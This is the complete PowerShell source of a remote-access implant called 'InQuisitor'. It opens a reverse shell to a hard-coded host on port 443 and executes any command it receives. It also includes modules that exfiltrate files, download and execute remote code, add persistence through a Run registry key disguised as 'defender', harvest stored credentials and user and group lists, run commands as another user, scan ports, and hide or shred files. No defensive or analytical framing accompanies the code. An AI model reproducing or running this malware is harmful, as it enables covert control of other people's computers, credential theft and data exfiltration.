$global:jobs = @{}

function upload($src, $dst)
{
    $client = new-object System.Net.WebClient;
    try{$client.UploadFile($dst,$src);return ("{#} uploaded to " + $dst + "`n")}
    catch{return "{#} could not upload file"}
}

function download($url, $dst)
{
    $client = new-object System.Net.WebClient;
    try{$client.DownloadFile($src,$dst);return ("{#} downloaded to " + $dst + "`n")}
    catch{return "{#} could not download file"}
}

function shred($fl)
{
    $content = get-content $fl;
    $encode = [system.convert]::ToBase64String([System.Text.Encoding]::ASCII.getbytes($content));
    $encode | out-file $fl;
    try{remove-item $fl;return ("{#} shredded " + $fl + "`n")}
    catch{return ("{#} could not shred " + $fl + "`n")}
}

function execstr($src)
{
	if ($src.contains("http") -and $src.contains("//"))
    {
		$path_string = (new-object System.Net.WebClient).downloadstring($src);
    }
	else
    {
		try
        {
			$path_string = get-content $src
        }
		catch
        {
			return "{#} Error: path could not be found`n"
        }
    }
	$proc = iex $path_string;
	return $proc;
}

function execjob($command, $time_out)
{
    if ($time_out -eq $null -or $command -eq $null)
    {
        return "{#} argument missing";
    }
    else
    {
        $jname = $(Get-Random -Minimum 1000 -Maximum 9999).ToString()
        $job = ("start-job -ScriptBlock {start-job -scriptblock {" + $command + "} | wait-job -Timeout " + $time_out +" | Receive-job}");
        $jobify = iex $job;
        $global:jobs.add($jname,$jobify);
        return $("{#} scheduled job " + $jname + "`n")
    }
}

function receivejob($name)
{
    try
    {
        $out = receive-job -id $global:jobs[$name].Id;
        return $("{#} output: " + $($out -join "`n"))
    }
    catch{return $("{#} could not retrieve output")}
}

function portscan($rhst,$brt)
{
    $rhst = $rhst.replace(" ","");
    $brt = $brt.replace(" ","");
    $borts = @();
    $rhost = @();
    if ($brt.contains(","))
    {
        $borts = $brt.split(",");
    }
    elseif ($brt.contains("-"))
    {
        $trb = $brt.split("-");
        foreach ($ib in $trb)
        {
            $borts += $ib;
        }
    }
    else
    {
        $borts = $brt.split(" ");
    }

    if ($rhst.contains(","))
    {
        $rhost = $rhst.split(",");
    }
    elseif ($rhst.contains("-"))
    {
        $kr = $rhst.split("-")[0];
        $kv = $rhst.split("-")[1];
        $ki = $kr.split(".")[-1];
        $ka = $kv.split(".")[-1];
        $km = $kr.split(".")[0..2];
        $kl = ($km -join [char]46) + [char]46;
        foreach($i in $ki..$ka)
        {
            $rhost += $kl + $i.tostring();
        }
    }
    else
    {
        $rhost = $rhst;
    };
    $bh = @()
    foreach ($bt in $borts)
    {
        $ErrorActionPreference= 'silentlycontinue';
        foreach ($a in $rhost)
        {
            $bc = new-object System.Net.Sockets.TcpClient;
            $bs = $bc.BeginConnect($a,$bt,$null,$null);
            $bg = $bs.AsyncWaitHandle.WaitOne(5,$false);
            if ($bg -eq $false)
            {
                continue;
            }
            else
            {
                try
                {
                    $bc.EndConnect($bs);
                    $sk = ($a + ":" + $bt);
                    $bh += ($sk);
                }
                catch{}
            }
        }
    }
    return ($bh -join ", ")
}

function privchecker($acl)
{
    $pivs = @();
    $privs += $(get-process | out-string);
    $privs += $(netstat -ano);
    $privs += $(quser);
    $privs += $(net users);
    $privs += $(net localgroup administrators);
    $privs += $(cmdkey.exe /list);
    $privs += $(get-acl $acl).Access;
    return $($privs -join "[\n]");
}

function persist($url)
{
    $persistpath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run";
    Set-ItemProperty -Path $persistpath -Name "defender" -value $("cmd.exe /k powershell.exe -w 1 iex (new-object system.net.webclient).downloadstring('" + $url + "')");
    return "{#} Persisted in HKCU Run key`n";
}

function runelevated($command,$user,$password)
{
    $secstring = ConvertTo-SecureString $password -AsPlainText -Force;
    $credential = New-Object System.Management.Automation.PSCredential($user, $secstring);   
    try{$invocation = [system.diagnostics.process]::start("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",$command,$credential.UserName,$credential.Password,$(hostname));return $invocation}
    catch{return "{#} could not run elevated"}
}

function filesearch($method,$search,$dir)
{
    $gcir = (gci -r $dir).FullName;
    $files = @();
    if ($method -eq "name")
    {
        foreach ($fl in $gcir)
        {
            if ($($fl).tolower().contains($search.tolower()))
            {
                $files += ($fl)
            }
        }
    }
    elseif ($method -eq "content")
    {
        foreach ($fl in $gcir)
        {
            if ($(get-content $fl).tolower().contains($search.tolower()))
            {
                $files += ($fl)
            }
        }
    }
    elseif ($method -eq "owner")
    {
        foreach ($fl in $gcir)
        {
            if (($(get-acl $fl).owner).tolower().Contains($search.tolower()))
            {
                $files += ($fl)
            }
        }
    }
    if ($files.Count -eq 0)
    {
        $files += ("{#} no matches`n")
    }
    return $($files -join "[\n]")
}

function hidefile($fl)
{
    try{[io.file]::SetAttributes($fl,'hidden');return $("{#} hid file " + $fl + "`n")}
    catch{return $("{#} could not hide file " + $fl + "`n")}
}

function cmdparse($data)
{
    $spdata = $data.split(" ");
	$cmd = $spdata[0];
	$args = @{};
    $key = $null;
	foreach ($x in $spdata[1..$($spdata.length - 1)])
    {
        if ($x.contains("=")){$esp = $x.split("=");$key = $esp[0];$args.add($esp[0],$esp[1])}
        else{$args.$key += $(" " + $x)}
    }
	if ($cmd -eq "upload"){$ret = upload $args["source"] $args["destination"]}
	elseif ($cmd -eq "download"){$ret = download $args["source"] $args["destination"]}
	elseif ($cmd -eq "shred"){$ret = shred $args["file"]}
	elseif ($cmd -eq "execstr"){$ret = execstr $args["source"] $args["context"]}
	elseif ($cmd -eq "execjob"){$ret = execjob $args["command"] $args["timeout"]}
    elseif ($cmd -eq "receivejob"){$ret = receivejob $args["name"]}
	elseif ($cmd -eq "hidefile"){$ret = hidefile $args["file"]}
	elseif ($cmd -eq "portscan"){$ret = portscan $args["host"] $args["port"]}
	elseif ($cmd -eq "persist"){$ret = persist $args["url"]}
	elseif ($cmd -eq "runelevated"){$ret = runelevated $args["command"] $args["user"] $args["password"]}
	elseif ($cmd -eq "filesearch"){$ret = filesearch $args["method"] $args["search"] $args["dir"]}
	elseif ($cmd -eq "privchecker"){$ret = privchecker $args["acl"]}
	return $ret
}

$embedded_commands = @{"help"="print this message";"upload"="upload file to http POST upload server";"download"="download file from http listener";"shred"="secure file delete";"execstr"="read string and execute";"execjob"="execute command as job";"receivejob"="retrieve output of job scheduled in execjob";"hidefile"="add hidden attribute to a file";"portscan"="connect scan and ping sweep";"persist"="install InQuisitor";"runelevated"="run command as superuser (runs as job)";"filesearch"="search for files";"privchecker"="look for possible elevation mechanisms"}
$cmd_help = @{"upload"="usage : upload source=<source file> destination=<destination http url>`n";"download"="usage : download source=<source url> destination=<file absolute path>`n";"shred"="usage : shred file=<file absolute path>`n";"execstr"="usage : execstr source=<full url / file absolute path>`n";"execjob"="usage : execjob command=<shell command to run> timeout=<time in seconds>`n";"receivejob"="usage : receivejob name=<name of job from execjob>`n";"hidefile"="usage : hidefile file=<file absolute path>`n";"portscan"="usage : host=<','-separated list or '-'-separated range> port=<','-separated list or '-'-separated range>`n";"persist"="usage : persist url=<full url hosting payload>`n";"runelevated"="usage : runelevated command=<command to run> user=<user to runas> password=<password of user>`n";"filesearch"="usage : filesearch method=<content / name / owner> search=<string to search for> dir=<top dir to recurse>`n";"privchecker"="usage : privchecker acl=<file to check acl on>`n"}
$lh = "192.168.186.130"
$lp = 443

$cn = [environment]::ExpandEnvironmentVariables("%COMPUTERNAME%");
$ic = @"
                                                       
_-_,         ,-||-,                        ,              
  //        /'|||  )          '        '  ||             
  || \\/\\ (( |||--))  \\ \\ \\  _-_, \\ =||=  /'\\  \\.`, 
 ~|| || || (( |||--))  || || || ||_.  ||  ||  || ||  ||  ` 
  || || ||  ( // ._).  || || ||  ~ || ||  ||  || ||  ||   
_-_, \\ \\   -__./\\,  \\/\\ \\ ,-_-  \\  \\, \\,/   \\,  
                                                       
{#} InQuisitor for Windows, Version 1.0`n
"@;
$ih = ("{#} Hostname: " + [environment]::ExpandEnvironmentVariables("%COMPUTERNAME%") + "`n");
$ix = ("{#} System: " + $(gwmi win32_operatingsystem).version + "`n");
$ik = @"
{#} Type 'help' for a list of embedded commands or run a shell command
{#} Type 'exit' or 'quit' to close shell`n`n
"@
$im = ($ic + $ih + $ix + $ik)
$ci = [system.text.encoding]::ASCII.GetBytes($im);
$es = New-Object System.Net.Sockets.TcpClient;
$es.Connect($lh, $lp);
$ts = $es.GetStream();
$writer = New-Object System.IO.StreamWriter($ts);
$writer.AutoFlush = $true;
$writer.Write($ci, 0, $ci.length);
$buf = new-object System.Byte[] 1024;
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
$encoding = new-object System.Text.ASCIIEncoding
if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true)
{
    $prompt = "InQuisitor~$ "
}
else
{
    $prompt = "InQuisitor~# "
}
$writer.write($prompt)


while ($es.Connected)
{
    while ($ts.DataAvailable)
    {
        $tts = $ts.read($buf, 0, 1024);
        $re = $encoding.GetString($buf[0..($tts - 2)]);
        $cmdchk = $re.split(" ")[0]
        if ($re.contains("quit") -or $re.Contains("exit"))
        {
            exit;
        }
        elseif ($re.contains("help"))
        {
            $writer.write("{#} InQuisitor command list`n")
            $writer.write("{#} Type '<command> usage' for help message`n")
            foreach ($embed in $embedded_commands.keys)
            {
                $cmd = ("    {>} " + $embed + " : " + $embedded_commands[$embed] + "`n")
                $writer.write($cmd)
            }
        }
        elseif ($embedded_commands.ContainsKey($cmdchk))
        {
            if ($re.ToLower().Contains("usage"))
            {
                $ret_data = ("{#} " + $cmd_help[$cmdchk])
            }
            else
            {
                $ret_data = cmdparse $re
            }
            $writer.write($ret_data + "`n")
        }
        else
        {
            $shout = Invoke-Expression $re;
            foreach ($st in $shout)
            {
                $sk = $st | out-string;
                $writer.Write($sk)
            }
        }
        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()); 
        if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true)
        {
            $prompt = "InQuisitor~$ ";
        }
        else
        {
            $prompt = "InQuisitor~# ";
        }
        $writer.write($prompt); 
    }
    start-sleep -Milliseconds 500
}
$writer.Close()
